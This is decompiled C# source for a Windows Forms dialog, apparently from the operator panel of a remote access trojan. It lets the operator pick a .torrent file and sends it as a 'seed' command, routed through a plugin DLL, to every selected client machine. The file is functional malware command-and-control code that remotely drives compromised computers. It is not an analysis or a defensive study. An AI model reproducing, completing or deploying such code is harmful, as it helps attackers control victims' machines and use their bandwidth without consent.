using System;
using System.ComponentModel;
using System.Drawing;
using System.IO;
using System.Threading;
using System.Windows.Forms;
using Server.Algorithm;
using Server.Connection;
using Server.MessagePack;

namespace Server.Forms
{
	// Token: 0x02000074 RID: 116
	public partial class FormTorrent : Form
	{
		// Token: 0x060002B8 RID: 696 RVA: 0x00020718 File Offset: 0x0001E918
		public FormTorrent()
		{
			this.InitializeComponent();
		}

		// Token: 0x060002B9 RID: 697 RVA: 0x00020728 File Offset: 0x0001E928
		private void Button1_Click(object sender, EventArgs e)
		{
			OpenFileDialog openFileDialog = new OpenFileDialog();
			openFileDialog.Filter = "(*.torrent)|*.torrent";
			if (openFileDialog.ShowDialog() == DialogResult.OK)
			{
				this.textBox1.Text = openFileDialog.FileName;
				this.IsOk = true;
				return;
			}
			this.textBox1.Text = "";
			this.IsOk = false;
		}

		// Token: 0x060002BA RID: 698 RVA: 0x000201C4 File Offset: 0x0001E3C4
		private void Button3_Click(object sender, EventArgs e)
		{
			base.Close();
		}

		// Token: 0x060002BB RID: 699 RVA: 0x00020780 File Offset: 0x0001E980
		private void Button2_Click(object sender, EventArgs e)
		{
			try
			{
				if (this.IsOk)
				{
					MsgPack msgPack = new MsgPack();
					msgPack.ForcePathObject("Packet").AsString = "torrent";
					msgPack.ForcePathObject("Option").AsString = "seed";
					msgPack.ForcePathObject("File").SetAsBytes(File.ReadAllBytes(this.textBox1.Text));
					MsgPack msgPack2 = new MsgPack();
					msgPack2.ForcePathObject("Packet").AsString = "plugin";
					msgPack2.ForcePathObject("Dll").AsString = GetHash.GetChecksum("Plugins\\Miscellaneous.dll");
					msgPack2.ForcePathObject("Msgpack").SetAsBytes(msgPack.Encode2Bytes());
					foreach (object obj in Program.form1.listView1.SelectedItems)
					{
						ThreadPool.QueueUserWorkItem(new WaitCallback(((Clients)((ListViewItem)obj).Tag).Send), msgPack2.Encode2Bytes());
					}
					base.Close();
				}
			}
			catch (Exception ex)
			{
				MessageBox.Show(ex.Message);
			}
		}

		// Token: 0x0400028A RID: 650
		private bool IsOk;
	}
}
